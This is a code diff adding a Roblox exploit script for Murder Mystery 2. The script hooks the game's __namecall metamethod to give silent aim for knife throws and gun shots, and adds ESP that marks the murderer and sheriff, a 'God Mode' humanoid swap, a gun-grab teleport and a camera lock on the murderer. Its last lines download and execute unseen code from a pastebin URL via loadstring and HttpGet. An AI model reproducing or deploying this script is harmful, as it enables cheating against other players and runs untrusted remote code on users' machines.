@@ -1,0 +1,594 @@
+    local _ScreenGui = Instance.new('ScreenGui')
+
+    _ScreenGui.Name = 'MiGui'
+    _ScreenGui.ResetOnSpawn = false
+    _ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')
+    _ScreenGui.Enabled = true
+    _ScreenGui.IgnoreGuiInset = true
+
+    local _TextButton = Instance.new('TextButton')
+
+    _TextButton.Text = 'Open'
+    _TextButton.Size = UDim2.new(0.2, 0, 0.07, 0)
+    _TextButton.Position = UDim2.new(0.03, 0, 0.1, 0)
+    _TextButton.AnchorPoint = Vector2.new(0, 0)
+    _TextButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+    _TextButton.TextColor3 = Color3.new(1, 1, 1)
+    _TextButton.Font = Enum.Font.SourceSans
+    _TextButton.TextScaled = true
+    _TextButton.BorderSizePixel = 0
+    _TextButton.Parent = _ScreenGui
+
+    local _UICorner = Instance.new('UICorner')
+
+    _UICorner.CornerRadius = UDim.new(0, 5)
+    _UICorner.Parent = _TextButton
+
+    local _Frame = Instance.new('Frame')
+
+    _Frame.Size = UDim2.new(0.4, 0, 0.5, 0)
+    _Frame.Position = UDim2.new(0.05, 0, 0.2, 0)
+    _Frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    _Frame.BackgroundTransparency = 0.3
+    _Frame.BorderSizePixel = 0
+    _Frame.Visible = false
+    _Frame.Parent = _ScreenGui
+
+    local _UICorner2 = Instance.new('UICorner')
+
+    _UICorner2.CornerRadius = UDim.new(0, 15)
+    _UICorner2.Parent = _Frame
+
+    local _TextLabel = Instance.new('TextLabel')
+
+    _TextLabel.Text = 'NX CRAZY DEV MM2'
+    _TextLabel.Size = UDim2.new(0.9, 0, 0.2, 0)
+    _TextLabel.Position = UDim2.new(0.05, 0, 0.05, 0)
+    _TextLabel.TextColor3 = Color3.new(1, 1, 1)
+    _TextLabel.BackgroundTransparency = 1
+    _TextLabel.Font = Enum.Font.SourceSansBold
+    _TextLabel.TextScaled = true
+    _TextLabel.Parent = _Frame
+
+    local v8 = {
+        'Silent Aim',
+        'God Mode',
+        'Grab Gun',
+        'Cam Look',
+    }
+    local v118 = {
+        function()
+            game.StarterGui:SetCore('SendNotification', {
+                Title = 'Activated',
+                Text = 'By Nx Crazy',
+                Duration = 3,
+            })
+
+            local u12 = setmetatable({}, {
+                __index = function(p9, p10)
+                    local v11 = game.GetService(game, p10)
+
+                    if v11 then
+                        p9[p10] = v11
+                    end
+
+                    return v11
+                end,
+            })
+            local _LocalPlayer = u12.Players.LocalPlayer
+            local _ = workspace.CurrentCamera
+            local u14 = {
+                Knife = {
+                    Index = 'Murderer',
+                    Color = Color3.fromRGB(255, 0, 0),
+                },
+                Gun = {
+                    Index = 'Sheriff',
+                    Color = Color3.fromRGB(0, 0, 255),
+                },
+            }
+            local u15 = {
+                'rbxassetid://2467567750',
+                'rbxassetid://1957618848',
+                'rbxassetid://2470501967',
+                'rbxassetid://2467577524',
+            }
+            local u16 = {
+                Murderer = nil,
+                Sheriff = nil,
+                Closest = nil,
+            }
+            local u17 = {}
+            local u18 = true
+            local u19 = true
+            local _Humanoid = (_LocalPlayer.Character or _LocalPlayer.CharacterAdded:Wait()):WaitForChild('Humanoid')
+
+            _LocalPlayer.CharacterAdded:Connect(function(p21)
+                _Humanoid = p21:WaitForChild('Humanoid')
+            end)
+
+            local u22 = RaycastParams.new()
+
+            u22.IgnoreWater = true
+            u22.FilterType = Enum.RaycastFilterType.Blacklist
+            u22.FilterDescendantsInstances = {
+                _LocalPlayer.Character,
+            }
+
+            local u36 = {
+                ESP = function(p23, p24)
+                    if p23:FindFirstChildOfClass('BoxHandleAdornment') then
+                        return p23:FindFirstChildOfClass('BoxHandleAdornment')
+                    end
+
+                    local _BoxHandleAdornment = Instance.new('BoxHandleAdornment')
+
+                    _BoxHandleAdornment.Size = p23.Size + Vector3.new(0.1, 0.1, 0.1)
+                    _BoxHandleAdornment.Name = 'Mesh'
+                    _BoxHandleAdornment.Visible = u18
+                    _BoxHandleAdornment.Adornee = p23
+                    _BoxHandleAdornment.Color3 = p24
+                    _BoxHandleAdornment.AlwaysOnTop = true
+                    _BoxHandleAdornment.ZIndex = 5
+                    _BoxHandleAdornment.Transparency = 0.5
+                    _BoxHandleAdornment.Parent = p23
+
+                    table.insert(u17, _BoxHandleAdornment)
+
+                    return _BoxHandleAdornment
+                end,
+                NotifyRoles = function()
+                    if u16.Murderer then
+                        local v26, _ = u12.Players:GetUserThumbnailAsync(u16.Murderer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+
+                        u12.StarterGui:SetCore('SendNotification', {
+                            Title = 'Murderer',
+                            Text = u16.Murderer.Name,
+                            Icon = v26,
+                            Duration = 5,
+                        })
+                    end
+                    if u16.Sheriff then
+                        local v27, _ = u12.Players:GetUserThumbnailAsync(u16.Sheriff.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+
+                        u12.StarterGui:SetCore('SendNotification', {
+                            Title = 'Sheriff',
+                            Text = u16.Sheriff.Name,
+                            Icon = v27,
+                            Duration = 5,
+                        })
+                    end
+                end,
+                GetClosestPlayer = function(p28)
+                    local u29 = p28 or math.huge
+                    local v30, v31, v32 = ipairs(u12.Players.GetPlayers(u12.Players))
+                    local u33 = nil
+
+                    while true do
+                        local u34
+
+                        v32, u34 = v30(v31, v32)
+
+                        if v32 == nil then
+                            break
+                        end
+                        if u34 ~= _LocalPlayer then
+                            pcall(function()
+                                local _Magnitude = (_LocalPlayer.Character.PrimaryPart.Position - u34.Character.PrimaryPart.Position).Magnitude
+
+                                if _Magnitude < u29 then
+                                    u29 = _Magnitude
+                                    u33 = u34
+                                end
+                            end)
+                        end
+                    end
+
+                    return u33
+                end,
+            }
+            local v60 = {
+                Initialize = function(p37)
+                    local function v50(_)
+                        p37:WaitForChild('Backpack').ChildAdded:Connect(function(p38)
+                            local u39 = u14[p38.Name]
+
+                            if u39 then
+                                u16[u39.Index] = p37
+
+                                local u40 = u36.ESP(p37.Character.HumanoidRootPart, u39.Color)
+                                local _Animator = p37.Character:FindFirstChildWhichIsA('Humanoid'):WaitForChild('Animator')
+
+                                _Animator.AnimationPlayed:Connect(function(p42)
+                                    local v43
+
+                                    if p42 then
+                                        v43 = p42.Animation
+                                    else
+                                        v43 = p42
+                                    end
+                                    if v43 == nil then
+                                        return
+                                    end
+                                    if table.find(u15, p42.Animation.AnimationId) then
+                                        u40.Color3 = Color3.fromRGB(255, 0, 255)
+
+                                        while true do
+                                            u12.RunService.Heartbeat:Wait(0.01)
+
+                                            local v44 = _Animator:GetPlayingAnimationTracks()
+                                            local v45, v46, v47 = ipairs(v44)
+                                            local v48 = false
+
+                                            while true do
+                                                local v49
+
+                                                v47, v49 = v45(v46, v47)
+
+                                                if v47 == nil then
+                                                    break
+                                                end
+                                                if table.find(u15, v49.Animation.AnimationId) then
+                                                    v48 = true
+                                                end
+                                            end
+
+                                            if v48 == false then
+                                                u40.Color3 = u39.Color
+                                            end
+                                        end
+                                    else
+                                        return
+                                    end
+                                end)
+                            end
+                        end)
+                    end
+
+                    v50(p37.Character or p37.CharacterAdded:Wait())
+                    p37.CharacterAdded:Connect(v50)
+                end,
+                GunAdded = function(p51)
+                    if p51.Name == 'GunDrop' then
+                        u36.ESP(p51, Color3.fromRGB(255, 255, 255))
+                    end
+                end,
+                ContextActionService_C = function(_, p52, _)
+                    if p52 ~= Enum.UserInputState.End then
+                        u36.NotifyRoles()
+                    end
+                end,
+                ContextActionService_V = function(_, p53, _)
+                    if p53 ~= Enum.UserInputState.End then
+                        if _Humanoid.WalkSpeed == 16.5 or _Humanoid.WalkSpeed == 16 then
+                            _Humanoid.WalkSpeed = 20
+                        else
+                            _Humanoid.WalkSpeed = 16.5
+                        end
+
+                        u12.StarterGui:SetCore('SendNotification', {
+                            Title = 'Speed Change',
+                            Text = tostring(_Humanoid.WalkSpeed),
+                            Duration = 3,
+                        })
+                    end
+                end,
+                ContextActionService_B = function(_, p54, _)
+                    if p54 ~= Enum.UserInputState.End then
+                        u18 = not u18
+
+                        local v55, v56, v57 = ipairs(u17)
+
+                        while true do
+                            local v58
+
+                            v57, v58 = v55(v56, v57)
+
+                            if v57 == nil then
+                                break
+                            end
+
+                            v58.Visible = u18
+
+                            if v58.Parent == nil then
+                                table.remove(u17, v57)
+                            end
+                        end
+                    end
+                end,
+                ContextActionService_G = function(_, p59, _)
+                    if p59 ~= Enum.UserInputState.End then
+                        u19 = not u19
+
+                        u12.StarterGui:SetCore('SendNotification', {
+                            Title = 'Silent Aim',
+                            Text = 'Enabled: ' .. tostring(u19),
+                            Duration = 3,
+                        })
+                    end
+                end,
+            }
+            local v61 = getrawmetatable(game)
+            local ___namecall = v61.__namecall
+
+            setreadonly(v61, false)
+
+            v61.__namecall = newcclosure(function(p63, ...)
+                local v64 = getnamecallmethod()
+                local u65 = {...}
+
+                if u19 == true then
+                    u22.FilterDescendantsInstances = {
+                        _LocalPlayer.Character,
+                    }
+
+                    if v64 == 'FireServer' and tostring(p63) == 'Throw' then
+                        local v70, v71 = pcall(function()
+                            local _PrimaryPart = u36.GetClosestPlayer().Character.PrimaryPart
+                            local v67 = _PrimaryPart.AssemblyLinearVelocity * Vector3.new(1, 0, 1)
+                            local _Magnitude2 = (_PrimaryPart.Position - _LocalPlayer.Character.PrimaryPart.Position).Magnitude
+                            local v69 = v67 * 0.8 * _Magnitude2 / 100
+
+                            u65[2] = workspace.Raycast(workspace, _LocalPlayer.Character.PrimaryPart.Position, (_PrimaryPart.Position - (_LocalPlayer.Character.PrimaryPart.Position + v69)).Unit * 235, u22).Position
+                        end)
+
+                        if not v70 then
+                            warn(v71)
+                        end
+                    elseif v64 == 'InvokeServer' and (tostring(p63) == 'ShootGun' and u16.Murderer) then
+                        local v74, v75 = pcall(function()
+                            local _PrimaryPart2 = u16.Murderer.Character.PrimaryPart
+                            local v73 = _PrimaryPart2.AssemblyLinearVelocity / 40
+
+                            if math.abs(_PrimaryPart2.AssemblyLinearVelocity.Y) >= 10 then
+                                return 'Nullify Remote'
+                            end
+
+                            u65[2] = _PrimaryPart2.Position + v73
+                        end)
+
+                        if v74 then
+                            if v74 == 'Nullify Remote' then
+                                warn('Null')
+
+                                return
+                            end
+                        else
+                            warn(v75)
+                        end
+                    end
+                end
+
+                return ___namecall(p63, unpack(u65))
+            end)
+
+            setreadonly(v61, true)
+
+            local v76, v77, v78 = ipairs(u12.Players:GetPlayers())
+
+            while true do
+                local v79
+
+                v78, v79 = v76(v77, v78)
+
+                if v78 == nil then
+                    break
+                end
+
+                v60.Initialize(v79)
+            end
+
+            u12.Players.PlayerAdded:Connect(v60.Initialize)
+            workspace.ChildAdded:Connect(v60.GunAdded)
+            u12.ContextActionService:BindAction('SprintBind', v60.ContextActionService_V, false, Enum.KeyCode.V)
+            u12.ContextActionService:BindAction('NotifyBind', v60.ContextActionService_C, false, Enum.KeyCode.C)
+            u12.ContextActionService:BindAction('ESPBind', v60.ContextActionService_B, false, Enum.KeyCode.B)
+            u12.ContextActionService:BindAction('AIMBind', v60.ContextActionService_G, false, Enum.KeyCode.G)
+        end,
+        function()
+            local u80 = {}
+
+            function GodMode()
+                if game.Players.LocalPlayer.Character then
+                    if game.Players.LocalPlayer.Character:FindFirstChild('Humanoid') then
+                        local v81, v82, v83 = pairs(game.Players.LocalPlayer.Character.Humanoid:GetAccessories())
+
+                        while true do
+                            local v84
+
+                            v83, v84 = v81(v82, v83)
+
+                            if v83 == nil then
+                                break
+                            end
+
+                            table.insert(u80, v84:Clone())
+                        end
+
+                        game.Players.LocalPlayer.Character.Humanoid.Name = 'deku'
+                    end
+
+                    local v85 = game.Players.LocalPlayer.Character.deku:Clone()
+
+                    v85.Parent = game.Players.LocalPlayer.Character
+                    v85.Name = 'Humanoid'
+
+                    wait(0.1)
+                    game.Players.LocalPlayer.Character.deku:Destroy()
+
+                    workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+
+                    local v86, v87, v88 = pairs(u80)
+
+                    while true do
+                        local v89
+
+                        v88, v89 = v86(v87, v88)
+
+                        if v88 == nil then
+                            break
+                        end
+
+                        game.Players.LocalPlayer.Character.Humanoid:AddAccessory(v89)
+                    end
+
+                    game.Players.LocalPlayer.Character.Animate.Disabled = true
+
+                    wait(0.1)
+
+                    game.Players.LocalPlayer.Character.Animate.Disabled = false
+                end
+            end
+
+            GodMode()
+        end,
+        function()
+            local _LocalPlayer2 = game.Players.LocalPlayer
+            local _Position = _LocalPlayer2.Character.HumanoidRootPart.Position
+            local _GunDrop = workspace.GunDrop
+
+            if _GunDrop then
+                _LocalPlayer2.Character.HumanoidRootPart.CFrame = CFrame.new(_GunDrop.Position + Vector3.new(0, 3, 0))
+            else
+                game.StarterGui:SetCore('SendNotification', {
+                    Title = 'Gun No Drop',
+                    Text = 'By Nx Crazy',
+                    Icon = 'rbxassetid://16718480434',
+                })
+            end
+
+            wait(0.3)
+
+            _LocalPlayer2.Character.HumanoidRootPart.CFrame = CFrame.new(_Position)
+        end,
+        function()
+            local _ = game.Players.LocalPlayer
+
+            game:GetService('UserInputService')
+
+            local _ReplicatedStorage = game:GetService('ReplicatedStorage')
+            local _RunService = game:GetService('RunService')
+            local _ScreenGui2 = Instance.new('ScreenGui')
+
+            _ScreenGui2.ResetOnSpawn = false
+            _ScreenGui2.Parent = game.Players.LocalPlayer.PlayerGui
+
+            local _TextButton2 = Instance.new('TextButton')
+
+            _TextButton2.Size = UDim2.new(0, 160, 0, 50)
+            _TextButton2.Position = UDim2.new(1, -170, 0, 10)
+            _TextButton2.Text = 'Cam Look Murderer'
+            _TextButton2.Parent = _ScreenGui2
+            _TextButton2.BackgroundColor3 = Color3.new(0, 0, 0)
+            _TextButton2.TextColor3 = Color3.new(1, 1, 1)
+            _TextButton2.Font = Enum.Font.SourceSans
+            _TextButton2.TextSize = 12
+            _TextButton2.TextWrapped = true
+            _TextButton2.TextScaled = true
+
+            local _UICorner3 = Instance.new('UICorner')
+
+            _UICorner3.CornerRadius = UDim.new(0, 8)
+            _UICorner3.Parent = _TextButton2
+
+            local u98 = false
+            local u99 = nil
+            local u100 = 0.11
+
+            local function u104(p101)
+                local v102 = _ReplicatedStorage:FindFirstChild('GetPlayerData', true):InvokeServer()
+                local v103 = v102[p101.Name]
+
+                if v103 then
+                    v103 = v102[p101.Name].Role
+                end
+
+                return v103
+            end
+            local function u109()
+                local v105, v106, v107 = pairs(game.Players:GetPlayers())
+
+                while true do
+                    local v108
+
+                    v107, v108 = v105(v106, v107)
+
+                    if v107 == nil then
+                        break
+                    end
+                    if u104(v108) == 'Murderer' then
+                        return v108.Character
+                    end
+                end
+
+                return nil
+            end
+            local function u113(p110, p111, p112)
+                return p110 + p111 * p112
+            end
+            local function u116()
+                _RunService.RenderStepped:Connect(function()
+                    if u98 and u99 and u99:FindFirstChild('HumanoidRootPart') then
+                        local _CurrentCamera = workspace.CurrentCamera
+                        local v115 = u113(u99.HumanoidRootPart.Position, u99.HumanoidRootPart.Velocity, u100)
+
+                        _CurrentCamera.CFrame = CFrame.new(_CurrentCamera.CFrame.Position, v115)
+                    end
+                end)
+            end
+            local function v117()
+                if u98 then
+                    u98 = false
+
+                    _RunService:UnbindFromRenderStep('AimAtMurderer')
+                else
+                    u99 = u109()
+
+                    if u99 then
+                        u98 = true
+
+                        u116()
+                    else
+                        print('No murderer found')
+                    end
+                end
+            end
+
+            _TextButton2.MouseButton1Click:Connect(v117)
+        end,
+    }
+
+    for v119 = 1, 4 do
+        local v120 = v119
+        local _TextButton3 = Instance.new('TextButton')
+
+        _TextButton3.Text = v8[v120]
+        _TextButton3.Size = UDim2.new(0.4, 0, 0.15, 0)
+        _TextButton3.Position = UDim2.new(0.25 + (v120 - 1) % 2 * 0.5, 0, 0.4 + math.floor((v120 - 1) / 2) * 0.25, 0)
+        _TextButton3.AnchorPoint = Vector2.new(0.5, 0.5)
+        _TextButton3.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+        _TextButton3.TextColor3 = Color3.new(1, 1, 1)
+        _TextButton3.Font = Enum.Font.SourceSans
+        _TextButton3.TextScaled = true
+        _TextButton3.BorderSizePixel = 0
+        _TextButton3.Parent = _Frame
+
+        local _UICorner4 = Instance.new('UICorner')
+
+        _UICorner4.CornerRadius = UDim.new(0, 10)
+        _UICorner4.Parent = _TextButton3
+
+        _TextButton3.MouseButton1Click:Connect(v118[v120])
+    end
+
+    local u123 = false
+
+    _TextButton.MouseButton1Click:Connect(function()
+        u123 = not u123
+        _Frame.Visible = u123
+        _TextButton.Text = u123 and 'Close' or 'Open'
+    end)
+    loadstring(game:HttpGet('https://pastebin.com/raw/Q1aiZZQU'))()
+else
+    print('Player closed the GUI.')
+end
